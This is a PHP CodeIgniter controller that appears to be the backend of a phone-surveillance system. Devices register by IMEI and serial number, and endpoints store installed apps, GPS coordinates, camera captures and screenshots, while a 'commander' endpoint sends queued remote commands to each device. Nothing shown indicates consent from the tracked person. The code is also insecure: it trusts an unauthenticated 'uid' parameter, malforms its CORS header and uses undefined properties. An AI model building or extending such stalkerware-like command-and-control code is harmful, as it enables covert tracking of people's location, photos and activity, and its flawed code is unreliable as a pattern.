<?php

class Apiv4 extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->uid = !empty($this->input->get('uid')) ? $this->input->get('uid') : "";

        $this->versicode = !empty($this->input->get('versicode')) ? $this->input->get('versicode') : "";
        $this->versiname = !empty($this->input->get('versiname')) ? $this->input->get('versiname') : "";
    }
	
	function index(){
		
		$data = array();
		$data['response'] = 'Parameter Failed!';
        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
		echo json_encode($data);
	}



    function signin(){

        $token = $this->input->post('token',true);

        $response = array();
        $response["response"] = array();

        $users = $this->db->get_where('users', array('token' => $token) );
        if($users->num_rows() > 0){
            $serial = !empty($this->input->post('serial')) ? $this->input->post('serial') : "";
            $model = !empty($this->input->post('model')) ? $this->input->post('model') : "";
            $imei = !empty($this->input->post('imei')) ? $this->input->post('imei') : "";
            $nama = !empty($this->input->post('nama')) ? $this->input->post('nama') : "";

            $timestamp = date('Y-m-d H:i:s');

            foreach ($users->result_array() as $r){

                $this->db->where('user_id',$r["user_id"]);
                $this->db->update('users',array('last_active' => $timestamp));

                $item = array();
                $item['phone_id']  = "";
                $item['phone_name']  = "";


                if(!empty($serial) && !empty($model) ){

                    $phone = $this->db->get_where('phone', array(
                        'uid'=> $this->uid
                    ) );
                    if($phone->num_rows() > 0){
                        foreach ($phone->result_array() as $r2){
                            $item['phone_id']  = $r2['phone_id'];
                            $item['phone_name']  = $r2['phone_name'];

                            $this->db->where(array(
                                'phone_id'=> $r2["phone_id"],
                                'phone_serial'=> $serial,
                                'phone_model'=> $model
                            ));

                            $this->db->update('phone',array(
                                'phone_name' => $nama,
                                'versicode' => $this->versicode,
                                'versiname' => $this->versiname
                            ));
                        }
                    }else{
                        if( empty($nama) ) $nama = $model;


                        $data = array(
                            'uid' => $this->uid,
                            'phone_name' => $nama,
                            'phone_imei' => $imei,
                            'phone_serial' => $serial,
                            'phone_model' => $model,
                            'versicode' => $this->versicode,
                            'versiname' => $this->versiname,
                            'ForceUpload' => 1
                        );
                        $this->db->insert('phone',$data);
                        $id = $this->db->insert_id();

                        $item['phone_id'] = $id;
                        $item['phone_name']  = $nama;

                    }
                }



                array_push($response["response"], $item);
            }

            $response["success"] = true;

        }else{
            $response["success"] = false;
            $response["response"] = "Tidak ditemukan data";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
	}


    function collect_phone_details(){
        $k = $this->input->post("k");
        $v = $this->input->post("v");

        $response = array();

        $sql = $this->db->get_where('collect_phone_details', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'v' => $v
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('collect_phone_details',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'k' => $k,
                'v' => $v
            ));

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
        echo json_encode($response);
    }

    function collect_installed_apps(){

        $app_name = $this->input->post("app_name");
        $app_package = $this->input->post("app_package");
        $app_uid = $this->input->post("app_uid");
        $app_vname = $this->input->post("app_vname");
        $app_vcode = $this->input->post("app_vcode");

        $response = array();

        $sql = $this->db->get_where('collect_installed_apps', array(
            'uid' => $this->user_id,
            'app_uid' => $app_uid,
            'app_vcode' => $app_vcode
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('collect_installed_apps',array(
                'uid' => $this->user_id,
                'app_uid' => $app_uid,
                'app_vcode' => $app_vcode,
                'app_name' => $app_name,
                'app_package' => $app_package,
                'app_vname' => $app_vname
            ));

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
        echo json_encode($response);

    }

    function commander(){

        $command = $this->input->get("command");

        $response = array();
        $response["response"] = array();
        $response["success"] = false;

        $timestamp = date('Y-m-d H:i:s');
        $this->db->where(array( 'uid' => $this->uid));
        $this->db->update('phone',array('phone_last_active' => $timestamp));

        if($command == "get") {
            $sql = $this->db->get_where('commands', array(
                'panding' => 1,
                'uid' => $this->uid
            ));

            if($sql->num_rows() > 0){
                foreach ($sql->result_array() as $r) {
                    $item = array();
                    $item['start'] = $r['start'];
                    $item['end'] = $r['end'];
                    $item['id'] = $r['id'];
                    $item['param1'] = $r['param1'];
                    $item['param2'] = $r['param2'];
                    $item['param3'] = $r['param3'];
                    $item['param4'] = $r['param4'];
                    $item['panding'] = $r['panding'];

                    array_push($response["response"], $item);
                }

                $response["success"] = true;
            } else {
                $response["success"] = false;
            }
        }elseif($command == "set"){

            $id = $this->input->get("id");

            $sql = $this->db->get_where('commands', array(
                'panding' => 1,
                'uid' => $this->uid,
                'id' => $id
            ));

            if($sql->num_rows() > 0){

                $timestamp = date('Y-m-d H:i:s');

                $this->db->where(array('uid' => $this->uid, 'id' => $id,'panding' => 1));
                $this->db->update('commands', array(
                    'panding' => 0,
                    'end' => $timestamp
                ));

                $response["success"] = true;
            } else {

                $response["success"] = false;
            }
        }else{

            $response["success"] = false;
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }


    function status(){

        $response = array();
        $response["success"] = true;
        $response["response"] = array();

        $dd = array();
        $dd['ForceWifiOnForRecordUpload'] = false;

        array_push($response['response'],$dd);

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }


    function statusupload(){


        $response = array();
        $response["success"] = true;
        $response["response"] = array();
        $timestamp = date('Y-m-d G:i:s');

        $users = $this->db->get_where('phone', array('uid' => $this->uid) );
        if($users->num_rows() > 0){

            $this->db->where(array( 'uid' => $this->uid));
            $this->db->update( 'phone', array(
                'phone_last_active'=>$timestamp,
                'versicode'=>$this->versicode,
                'versiname'=>$this->versiname
            ));

            $dd = array();
            $dd['ForceUpload'] = false;
            $phone = $this->db->get_where('phone', array( 'uid'=> $this->uid, ),1 )->result_array();

            foreach ($phone as $r2){
                if($r2['ForceUpload'] > 0) $dd['ForceUpload'] = true;
            }

            array_push($response['response'],$dd);
        }else{
            $data = array(
                'uid' => $this->uid,
                'phone_imei' => "",
                'phone_serial' => "",
                'phone_model' => "",
                'ForceUpload' => 1,
                'versicode' => $this->versicode,
                'versiname' => $this->versiname
            );
            $this->db->insert('phone',$data);
            $id = $this->db->insert_id();

            $dd = array();
            $dd['ForceUpload'] = true;

            array_push($response['response'],$dd);

        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    /***
     * Apps Feature
     */


    function gps(){
        $coordinat = $this->input->post("coordinat");

        $response = array();

        $sql = $this->db->get_where('gps', array(
            'uid' => $this->uid,
            'coordinat' => $coordinat
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('gps',array(
                'uid' => $this->uid,
                'coordinat' => $coordinat,
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            //$gps_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function capture(){
        $image = $this->input->post("image");
        $for = $this->input->post("for");

        $response = array();
        $response["response"] = array();

        $sql = $this->db->get_where('camera', array(
            'user_id' => $this->uid,
            'image' => $image,
            'for' => $for
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('camera',array(
                'user_id' => $this->uid,
                'image' => $image,
                'for' => $for
            ));

            $response["success"] = true;
        } else {

            $response["success"] = false;
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function screenshot(){
        $screenshot = $this->input->post("screenshot");
    }



}
